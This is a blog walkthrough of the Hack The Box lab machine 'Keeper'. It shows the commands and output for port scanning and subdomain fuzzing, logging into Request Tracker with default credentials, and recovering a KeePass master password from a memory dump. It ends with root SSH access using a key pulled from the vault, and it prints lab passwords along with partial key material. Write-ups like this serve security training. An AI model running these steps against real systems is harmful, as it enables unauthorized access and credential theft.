---
layout: post
title: Hack The Box Walkthrough - Keeper
date: 2024-02-10
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/02/HTB/Keeper
img: 2024/02/Keeper/Keeper.png
---

In Keeper, I used default credentials to get into a ticketing application. I found the credentials to the machine in the information of a user. And finally used a Keepass dump to get the passphrase of the vault and used it to find root's SSH private key.

* Room: Keeper
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Keeper](https://app.hackthebox.com/machines/Keeper)
* Author: [knightmare](https://app.hackthebox.com/users/8930)

## Enumeration

I began the machine by scanning for open ports with RustScan.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                             
The Modern Day Port Scanner.
________________________________________                                                                             
: https://discord.gg/GFrQsGy           :                                                                                                                                                                                                   
: https://github.com/RustScan/RustScan :                                                                             
 --------------------------------------                                                                              
Nmap? More like slowmap.🐢                        
                                                          
[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.194.211:22                                 
Open 10.129.194.211:80
[~] Starting Script(s)    
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
                                                          
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 09:42 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.            
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed

...

Nmap scan report for target (10.129.194.211)
Host is up, received user-set (0.048s latency).
Scanned at 2023-10-01 09:42:24 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.64 seconds
```

There were two open ports.
* 22 (SSH)
* 80 (HTTP)

## Website

I opened a browser to look at the site on port 80.

![Please Raise a Ticket](/assets/images/2024/02/Keeper/PleaseRaiseATicket.png "Please Raise a Ticket")

The page add a link to create a support ticket. I added 'keeper.htb' and 'tickets.keeper.htb' to my hosts file and used `wfuzz` to look for other subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 12 -H "Host:FUZZ.keeper.htb" "http://keeper.htb" 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://keeper.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000527715:   200        153 L    325 W      4236 Ch     "tickets"                                                                                                                                                                 

Total time: 942.8320
Processed Requests: 648201
Filtered Requests: 648200
Requests/sec.: 687.5042
```

It did not find anything new.

I checked for a site on 'http://keeper.htb', it was the same page that I saw without the domain. And Feroxbuster did not find anything on it.

```bash
$ feroxbuster -u http://keeper.htb -o feroxKeeper.txt -x php                                                          
                                                                                                                     
 ___  ___  __   __     __      __         __   ___                                                                   
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___  
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────    
 🎯  Target Url            │ http://keeper.htb
 ��  Threads               │ 50
 �  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 �👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ feroxKeeper.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        5l       14w      149c http://keeper.htb/
[####################] - 3m    119601/119601  0s      found:1       errors:0      
[####################] - 3m    119601/119601  674/s   http://keeper.htb/    
```

I looked at the site on 'http://tickets.keeper.htb'. 

![Request Tracker Login Page](/assets/images/2024/02/Keeper/RequestTrackerLoginPage.png "Request Tracker Login Page")

It was the login page for [Request Tracker](https://bestpractical.com/request-tracker/), a software to manage IT tickets.

I tried simple SQL Injection in the login page. It did not work. I looked for default credentials and [found them](https://forum.bestpractical.com/t/default-password/20088). By default, it installs with a root user with the password 'password'. I tried the credentials, they worked.

![Connected](/assets/images/2024/02/Keeper/Connected.png "Connected")

Once connected, there was one issue in the tracker.

![Issue](/assets/images/2024/02/Keeper/Issue.png "Issue")

The issue history mentioned a [Keepass](https://keepass.info/) crash dump. But it was removed for security reasons.

![Issue History](/assets/images/2024/02/Keeper/History.png "Issue History")

I kept looking around. In the user information of the issue owner, I found a password.

![User Information](/assets/images/2024/02/Keeper/UserInformation.png "User Information")

I tried to connect to SSH with those credentials.

```bash
$ ssh lnorgaard@target                                     
The authenticity of host 'target (10.129.194.211)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
lnorgaard@target's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23

lnorgaard@keeper:~$ ls
RT30000.zip  user.txt

lnorgaard@keeper:~$ cat user.txt 
REDACTED
```

## Keepass

Once connected, I saw a zip file in the user's home folder. I downloaded it to my machine and unzip it.

```bash
$ scp lnorgaard@target:~/RT30000.zip .
lnorgaard@target's password: 
RT30000.zip                                                                                                                                                                                              100%   83MB   2.5MB/s   00:32    

$ unzip RT30000.zip 
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx 
 ```

The zip file contained a dump, and the Keepass database. I knew it was possible to recover the password from a dump from Keepass. I looked through it with `strings`. But it was too big to find anything. I looked around and found [a tool to read it](https://github.com/vdohney/keepass-password-dumper).

```bash
$ dotnet run ../KeePassDumpFull.dmp                     
Found: ●ø               
Found: ●ø          
Found: ●ø          
Found: ●ø           
Found: ●ø           
Found: ●ø           
Found: ●ø           
Found: ●ø           
Found: ●ø           
Found: ●ø           
Found: ●●d          
Found: ●●d          
Found: ●●d          
Found: ●●d           
Found: ●●d           
Found: ●●d                                                                                                           
Found: ●●d                 
Found: ●●d           
Found: ●●d
Found: ●●d
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g

...

Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●A
Found: ●I
Found: ●:
Found: ●=
Found: ●_
Found: ●c
Found: ●M

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 

...

17.:    e, 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}...
```

I tried opening the Keepass file and login as root with the extracted passphrase. It failed. I tried combination of the extracted words, still no luck. Eventually, I searched for what the words in the passphrase meant. It was close to the name of a Danish recipe. I tried the name of the recipe and it unlocked the Keepass file.

```bash
$ kpcli                                                                                                              
                                                                                                                     
KeePass CLI (kpcli) v3.8.1 is ready for operation.                                                                   
Type 'help' for a description of available commands.                                                                 
Type 'help <command>' for details on individual commands.                                                            
                                                                                                                     
kpcli:/> open passcodes.kdbx                                                                                          
Provide the master password: ************************* 
kpcli:/> ls                                                                                                          
=== Groups ===
passcodes/                         
```

It worked, I looked at the credentials it contained.

```bash
kpcli:/> cd passcodes/
kpcli:/passcodes> ls   
=== Groups ===  
eMail/             
General/
Homebanking/                    
Internet/
Network/                  
Recycle Bin/
Windows/
kpcli:/passcodes> cd eMail/
kpcli:/passcodes/eMail> ls
kpcli:/passcodes/eMail> cd ..

...

kpcli:/passcodes> cd Network/
kpcli:/passcodes/Network> ls
=== Entries ===
0. keeper.htb (Ticketing Server)                                          
1. Ticketing System                                                       
kpcli:/passcodes/Network> show -f 0

Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: F4><3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
...

kpcli:/passcodes/Network> show -f 1

Title: Ticketing System
Uname: lnorgaard
 Pass: Welcome2023!
  URL: 
Notes: http://tickets.keeper.htb
```

The file contained an SSH private key in the format used by Putty. I saved it to a file, and converted it to something OpenSSH could use.

```bash
$ puttygen puttyfile -O private-openssh -o root.key
```

I used the key to connect as root and read the flag.

```bash
$ ssh -i root.key root@target
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41

root@keeper:~# cat root.txt 
REDACTED
```